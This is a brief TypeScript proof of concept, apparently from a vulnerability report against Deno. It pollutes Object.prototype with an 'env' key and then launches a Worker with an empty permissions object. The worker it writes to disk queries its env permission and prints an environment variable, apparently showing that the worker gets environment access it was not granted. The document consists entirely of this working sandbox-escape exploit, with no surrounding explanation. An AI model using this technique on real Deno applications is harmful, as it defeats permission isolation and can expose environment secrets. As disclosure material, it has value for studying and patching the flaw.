// Create worker on the fly
Deno.writeTextFileSync(
  "./worker.ts",
  "console.log(await Deno.permissions.query({ name: 'env' }));" +
  "console.log('DENO_INSTALL_ROOT:', Deno.env.get('DENO_INSTALL_ROOT'));" +
  "Deno.exit(1);",
  { create: true },
);


// PoC
function pollute(key: string, value: any) {
  ((((Object as any).prototype as any)[key]) as any) = value;
}

pollute("env", true);
new Worker(
  import.meta.resolve("./worker.ts"),
  { type: "module", deno: { permissions: {/*some object*/} } },
);
